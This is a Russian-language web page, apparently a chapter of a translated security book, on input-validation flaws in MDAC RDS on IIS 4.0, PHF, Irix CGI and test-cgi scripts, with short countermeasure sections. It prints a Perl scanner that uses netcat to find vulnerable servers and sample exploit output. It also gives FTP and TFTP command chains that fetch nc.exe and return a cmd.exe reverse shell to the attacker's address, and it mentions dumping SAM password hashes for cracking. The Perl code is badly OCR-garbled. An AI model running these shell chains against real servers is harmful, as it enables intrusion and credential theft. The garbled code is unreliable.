<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
</head>
<link rel="stylesheet" href="../STYLE.css">
<body TEXT="#000000" BGCOLOR="#E7E3E7" LINK="#004080" VLINK="#004080" olink="#008080" Background="">
<table BORDER=0   COLS=3 WIDTH="16%" >
  <tr> 
    <td><a href="Index4.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index6.html"><img SRC="For.gif" BORDER=0 ></a></td>
  </tr>
</table>

 
<br>
<table width="100%" border="0">
  <tr>
    <td class="Text_n">
 
<p class="Tit_CN">
Несоответствие сценариев требованиям безопасности:
взлом при отсутствии проверки ввода</P>

<p class="Text_n">
Причиной взлома при отсутствии проверки ввода с использованием общего интерфейса шлюза (CGI — Common Gateway Interface), активных страниц сервера (ASP — Active Server Pages) и языка разметки CFML (Cold Fusion Markup Language), является промах либо разработчика, либо поставщика программного обеспечения. Основная проблема возникает из-за недостаточной обработки входных данных некоторого сценария. Если не позаботиться о проверке достоверности и последующей очистке входных данных, взломщик сможет передать сценарию нужный символ, скажем, локальную команду, в качестве параметра и таким образом локально запустить эту команду на Web-сервере.
<br>
<P align="center">
<span class="Text_b">Изъян MDAC RDS IIS 4.0</span></P>
<br>
<p class="Text_n">
Вскоре после того, как компания Microsoft справилась с проблемой, вызванной программой iishack, работа которой приводила к переполнению буфера сервера IIS (это произошло в июне 1999 года), в июле ей пришлось столкнуться с другой проблемой, связанной с Web-сервером. Данная проблема была описана в бюллетене компании Microsoft, посвященном вопросам безопасности, еще в 1998 году, но стала известна широкой общественности лишь в последнее время. Этот изъян возникает из-за недостатка одного из компонентов Microsoft доступа к данным (MDAC — Microsoft Data Access Components) службы RDS (Remote Data Service), который позволяет взломщику запускать любые команды на уязвимом сервере.
<br>

Первопричина проблемы заключается в объекте DataFactory службы RDS. По умолчанию он позволяет передавать удаленные команды серверу I1S. В этом случае команды запускаются с правами эффективного пользователя этой службы, которым обычно является пользователь SYSTEM (внутренний пользователь, обладающий привилегиями администратора). Это означает, что взломщик может получить удаленный доступ с правами администратора к любому серверу в мире', у которого имеется такой изъян.
<br>

Для проверки этой концепции компания Rain.forest.puppy разработала свой сценарий на языке Perl (его можно загрузить с Web-узла компании Security Focus
<span class="Text_b">http://vww.securityfocus.com</span>), посылающий запрос RDS в базу данных, которая служит в качестве образца и называется btcustmr.mdb. Целью запроса является запуск на сервере команды, вводимой пользователем.
<br>

Поиск уязвимых серверов в сети представляется простой задачей. Посмотрим, как можно обнаружить компоненты MDAC службы RDS. С помощью утилиты netcat и языка Perl можно просканировать подсети в поисках признаков уязвимого сервера — наличия динамически подключаемой библиотеки msadcs.dll. Если в результате обработки HTML-запроса будет получена строка appiication/x-varg, значит, высока вероятность того (хотя и не на 100%), что данная система уязвима. Ниже для примера приведен код на языке Perl, с помощью которого можно обнаружить данный изъян.
<br>
<p class="Code">
#!/usr/bin/perl<br>
if ($|ARGV &lt; 0) {<br>
print &quot;Ошибка в синтаксиме - попробуйте eщe pas.&quot;;<br>
print &quot;: mdac.pl 10.1.2.3-255&quot;;}<br>
doit($ARGV[0]); foreach $item (@hosts)<br>
{ portscan($item); }<br>
close OUTFILE;<br>
sub doit { $line = $_[0];<br>
if ($line!=/#/) {<br>
if ($line=~/-/) {<br>
Stmp = split/-/, $line; <br>
Ship = split//, $tmp[0]; <br>
@eip = split//, $tmp[lj; <br>
} else<br>
{<br>
@bip = split//, $line;<br>
@eip = split//, $line; }<br>
$al = $bip[0];<br>
$bl = $bip[l]; <br>
$cl = $bip[2];<br>
$dl = $bip[3]; <br>
Snum = @eip; if ($num==l) <br>
{ $a2 = $bip[0]<br>
$b2 = $bip[l] <br>
$c2 = $bip[2]<br>
$d2 = $eip[0]<br>
} elsif <br>
($num==2) <br>
{$a2 = $bip[0]<br>
$b2 = $bip[l]<br>
$c2 = $eip[0] <br>
$d2 = $eip[l] }<br>
elsif<br>
($num==3)<br>
{ <br>
$a2 = $bip[0]<br>
$b2 = $eip[0]<br>
$c2 = $eip[l]<br>
$d2 = $eip[2]<br>
} elsif <br>
($num== ) <br>
{ <br>
$a2 = $eip[0]<br>
$b2 '-= $eip[l] <br>
$c2 = $eip[2] <br>
$d2 = $eip[3] }<br>
# Ha базк IP-адреса подсети (класс A, B, C)задаем<br>
# корректные значения переменных.<br>
 check_end(); $aend=$a2;<br>
# Создание массива. <br>
while<br>
 ($al &lt; $aend)<br>
 ( while ($bl &lt; $bend)<br>
 { while ($cl &lt; $cend)<br>
 { while ($dl &lt; Sdend) {<br>
push (@hosts, &quot;$al.$bl.$cl.$dl&quot;&gt;;<br>
$dl+=l;<br>
check_end();<br>
}<br>
$cl+=l;<br>
$dl=0; <br>
}<br>
$bl+=l;<br>
$cl=0; <br>
}<br>
$al+=l; $bl=0; } } }<br>
sub portscan ( my $target = $_[0];<br>
print &quot;Сканируется порт $target.&quot;; local $/;<br>
open(SCAN,&quot;nc -vzn -w 2 $target 80 2»<br>
&amp;1I&quot;);<br>
# Порт открыт<br>
$result = &lt;SCAN&gt;;<br>
if   ($result=~/open/)<br>
{<br>
print   &quot;\tПорт 80 Ha $target  открыт . \n&quot;;<br>
print   OUTFILE   &quot;порт   80   открыт\n&quot;;<br>
open   (HTTP,    &quot;&gt;http.tmp&quot;);<br>
print HTTP &quot;GET /msadc/msadcs.dll HTTP/1.0\n\n&quot;;<br>
close HTTP;<br>
open(SCAN2, &quot;type http.tmp I nc -nvv -w 2 $target 80 2&gt;&amp;1 I&quot;);<br>
$result2 = &lt;SCAN2&gt;;<br>
if (Sresult2=~/Microsoft-IIS4.07)<br>
{ <br>
if ($result2=~/x-varg/){<br>
print &quot;<br>
$target уязвима против атаки MDAC.&quot;;<br>
print   OUTFILE   &quot;$target <br>
может быть уязвима против атаки  &amp;MDAC.&quot;;<br>
}<br>
}<br>
close   SCAN; <br>
} <br>
}<br>
sub check_end <br>
{<br>
if (($al==$a2) &amp;S ($bl==$b2) &amp;<br>
s ($cl==$c2)) {<br>
$dend=$d2; } <br>
else {<br>
$dend=255; } <br>
if (($al==$a2) &amp;&amp;<br>
($bl==$b2)) {<br>
$cend=$c2; }<br>
 else {<br>
$cend=255; } <br>
if ($al= =$a2)<br>
{<br>
$bend=$b2; - } <br>
else {<br>
$bend=255; <br>
} <br>
}<br>
</p>
При использовании параметра -n команды netcat требуется, чтобы в командной строке явно указывался IP-адрес
<P align="center">
<span class="Text_b">
&quot;Анатомия&quot; атаки</span></P>
<br>
<p class="Text_n">
Сценарий Perl можно найти на многих Web-узлах, в том числе в архиве NTBugtraq (<span class="Text_b">http://www.ntbugtraq.com</span>) или на узле компании Security Focus (<span class="Text_b">http://www.securityfocus.com</span>). Он работает одинаково эффективно как в системе UNIX, так и в NT, и предпринимает попытку установить связь с компонентами MDAC, чтобы добавить в запрос SQL строку | shell ($command) |. Когда компонент MDAC достигает команды shell, выполняется команда, заданная в переменной $ command. Для того чтобы убедиться в наличии описанной возможности, попробуйте запустить команду со следующим синтаксисом.
<br>
<p class="Code">
C:\&gt;<span class="Text_b">perl mdac_exploit.pl -h 192.168.50.11</span><br>
-- RDS exploit by rain forest puppy/ADM/Wiretrip--<br>
Command: &lt;run your command here&gt;<br>
Step 1: Trying raw driver to btcustmr.mdb<br>
winnt -&gt; c: Success!<br>
</p>

Разработка корректной команды для системы NT — непростая задача. Сомил Шах (Somil Shah) и Нитеш Даньяни (Nitesh Dhanjani) вместе с Джорджем Куртцом (George Kurtz) разработали интересную последовательность команд, которые можно загрузить с помощью TFTP или по FTP. В результате будет загружена и запущена утилита netcat, возвращающая обратно командную оболочку системы NT (cmd.exe). Например, с использованием средств FTP можно воспользоваться следующей последовательностью команд,
<br>
<p class="Code">
<span class="Text_b">&quot;cd SystemRoot &pound;&amp; echo $ftp_user&gt;ftptmp<br>
&amp;&amp; echo $ftp_pass»ftptmp<br>
&amp;&amp; echo bin»ftptmp &amp;&amp;<br>
echo get nc. exe»ftptmp<br>
&amp;&pound; echo bye»ftptmp &amp;&pound;<br>
ftp -s:ftptmp $ftp_ip &amp;&amp;<br>
del ftptmp &amp;&amp;<br>
attrib -r nc.exe &amp;&amp; nc<br>
-e cmd.exe $my_ip $my_port&quot;</span><br>
</p>

При использовании TFTP аналогичные команды будут выглядеть следующим образом,
<br>
<p class="Code">
<span class="Text_b">&quot;cd\%SystemRoot\%<br> &amp;&amp;tftp-i $tftp_ip GET nc.exe nc.exe &amp;S<br> attrib<br>
-r nc.exe &amp;&amp; nc -e cmd.exe $my_ip $my_port&quot;</span><br>
</p>

Применение этих команд в сценарии Perl позволит вернуть командную оболочку удаленной системы, с помощью которой можно будет загрузить любое количество файлов, включая утилиту pwdump.exe (позволяющую получить хэш-коды из базы данных SAM), а затем приступить к взлому с применением утилит
L0phtcrack или John vl.6. Если команда оказалась неработоспособной, то, не исключено, что на пути к порту TCP (FTP) с номером 21 или порту UDP (TFTP, 69) целевой системы находится маршрутизатор или брандмауэр.
<br>
<P align="center">
<span class="Text_b">
Контрмеры: защита компонентов МDАС службы RDS</span></P>
<br>
<p class="Text_n">
Для того чтобы предотвратить такие атаки, либо удалите все файлы, используемые в этом случае, либо измените конфигурационные параметры сервера.&nbsp;
<br>
<P align="center">
<span class="Text_b">
Изъяны CGI</span></P>
<br>
<p class="Text_n">
По-видимому, после переполнения буфера плохо написанные сценарии CGI являются наиболее опасными изъянами в Internet. В электронном мире еще можно найти Web-серверы, разработчики которых экономили время на программировании, а после того, как взломщик пробрался на сервер и навел там свои порядки, пожалели о своей спешке. В этом разделе описано несколько наиболее популярных изъянов сценариев CGI, а также последствия, к которым приводит их использование.
<br>
<P align="center">
<span class="Text_b">
Сценарии PHF</span></P>
<br>
<p class="Text_n">
Возможно, одним из наиболее старых и в наши дни редко встречающихся изъянов является сценарий PHF, который изначально применялся на серверах HTTPD центра NCSA (версия 1.5А-Export или более ранние) и сервера Apache (версии 1.0.3). Эта программа CGI является примером сценария, обеспечивающего интерфейс в виде форм, который можно использовать для поиска имен и адресов в адресной книге. Из-за того что в этом сценарии для проверки входных данных используется функция escape_shell_cmd(), он оказывается уязвимым для широко распространенной атаки, при которой обманным путем удается локально запускать команды. Символ новой строки (0х0а в шестнадцатеричной системе счисления) не проверяется при контроле правильности входных данных. Поэтому он может быть использован для прерывания выполнения сценария и запуска любой команды, указанной после этого символа, в локальном контексте Web-сервера. Например, введение следующего адреса URL приведет к извлечению файла паролей, если пользователь, запустивший Web-сервер, обладает правами доступа к этому файлу.
<br>
<P align="center">
<span class="Text_b">Контрмеры: защита сценариев РНР</span></P>
<br>
<P align="center">
<span class="Text_b">
Предотвращение</span></P>
<br>
<p class="Text_n">
Лучше всего удалите этот сценарий с Web-сервера. Скорее всего, на рабочем сервере такой сценарий не требуется.
<br>
<P align="center">
<span class="Text_b">
Обнаружение</span></P>
<br>
<p class="Text_n">
Средства обнаружения атак, направленных на использование изъяна PHF, встроены почти в каждую бесплатную или коммерческую систему выявления вторжений, так что в этом случае решить проблему безопасности будет несложно.
<br>
<p class="Prim">
С помощью программы phfprobe.pl можно привлечь взломщиков к своему Web-узлу и зафиксировать выполняемые ими действия. В процессе анализа полученных данных можно лучше продумать стратегию защиты. Данная программа Perl служит в качестве приманки, имитирующей сценарий PHF. Она отправляет взломщикам такие ответные сообщения, как будто предпринимаемые ими действия выполняются успешно. На самом же деле осуществляется сбор информации о взломщиках и их тактике. Эту ловушку следует применять только при полной уверенности в надежности системы.
</p>
<P align="center">
<span class="Text_b">
Изъяны CGI системы Irix</span></P>
<br>
<p class="Text_n">
Первое сообщение об изъяне CGI системы Irix появилось в 1997 году в бюллетене Bugtraq. Новость опубликовал Разван Драгомиреску (Razvan Dragomirescu). Он обнаружил, что в состав подсистемы Outbox Environment многих систем Irix входит несколько программ, уязвимых для взлома при отсутствии проверки ввода. Сценарий webdist.cgi, а также сценарии-оболочки систем Irix 5.x и 6.x позволяют взломщикам передавать локальные команды и запускать их на удаленном узле.&nbsp;
<br>
<P align="center">
<span class="Text_b">
Контрмеры против использования изъянов CGI систем Irix</span> </P>
<br>
<p class="Text_n">
Как и раньше, если сценарий не применяется, лучше всего удалить его из системы и тем самым предотвратить возможность использования его изъянов. Если же удалить сценарий невозможно, воспользуйтесь модулем обновления SGI, который можно найти по адресу
<span class="Text_b"> http://www.sgi.com/support/patch_intro.html.</span>
<br>
<P align="center">
<span class="Text_b">
test-cgi</span></P>
<br>
<p class="Text_n">
Впервые об этом изъяне широкой общественности сообщила группа
L0pht в 1996 году. С его использованием взломщик может удаленно получать информацию о файлах, которые имеются на целевом узле. Например, используя следующий URL, взломщик может просмотреть список всех файлов и каталогов, которые содержатся в каталоге сценариев (egi -bin).
<br>
<p class="Code">
http://192.168.51.101/cgi-bin/test-cgi?*
</p>

&nbsp;В результате на экран будет выведено значение переменной окружения QUERY_STRING.
<br>
<p class="Code">
QUERY_STRING = count.cgi createuser.pl nph-test-cgi phf php.cgi<br>
search.pl<br>
test-cgi wwwcount.cgi<br>
</p>

Конечно же, получение перечня имеющихся в системе сценариев поможет взломщику найти другие слабые места, через которые можно будет получить доступ к Web-серверу, например PHF, PHP и т.д. Эта информация откроет взломщику доступ к удаленному узлу с правами пользователя или даже суперпользователя, а впоследствии он добьется контроля над всей системой UNIX.
<br>
<P align="center"><span class="Text_b">
Контрмеры против использования изъянов ССI</span></P>
<br>
<p class="Text_n">
Если обычное решение проблемы (удаление сценария) по каким-либо причинам реализовать нельзя, стоит обратиться к некоторым ресурсам Internet, в которых можно найти советы по безопасному написанию сценариев.
<br>

</p></td>
  </tr>
</table>
<br>
<table BORDER=0  COLS=3 WIDTH="11%" >
  <tr> 
   <td><a href="Index4.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index6.html"><img SRC="For.gif" BORDER=0 ></a></td>
   
  </tr>
</table>
</body>
</html>
